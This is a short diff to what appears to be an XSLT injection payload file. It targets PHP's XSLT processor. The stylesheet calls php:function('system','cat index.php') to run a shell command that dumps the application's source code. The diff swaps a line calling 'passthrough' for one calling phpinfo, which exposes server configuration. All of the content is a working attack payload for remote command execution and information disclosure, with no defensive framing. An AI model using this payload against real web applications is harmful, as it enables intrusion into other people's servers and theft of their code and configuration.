@@ -2,6 +2,6 @@
     <xsl:template match="/">
       <xsl:value-of select="system-property('xsl:vendor')"/>
       <xsl:value-of select="php:function('system','cat index.php')"/>
-      <xsl:value-of select="php:function('passthrough','cat index.php')"/>
+      <xsl:value-of select="php:function('phpinfo','')"/>
     </xsl:template>
   </xsl:stylesheet>
